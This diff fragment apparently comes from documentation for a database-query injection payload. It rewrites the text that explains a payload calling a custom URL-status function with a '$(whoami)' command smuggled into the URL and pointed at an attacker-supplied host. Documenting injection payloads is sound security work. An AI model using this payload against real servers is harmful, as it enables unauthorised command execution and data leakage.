@@ -39,7 +39,7 @@ This payload returns the hash of the string "test", which is then used for compa
 CALL custom.getUrlStatusCode("http://ip:port/?c=$(whoami)")
 ```
 
-This payload uses custom function that tries to return a status code, but also executes command given at the end.
+This payload leverages a custom function to retrieve the HTTP status code from a specified URL. However, it also includes a command injection ($(whoami)) at the end of the URL, which attempts to execute a system command on the server.
 
 ### How to use?
 
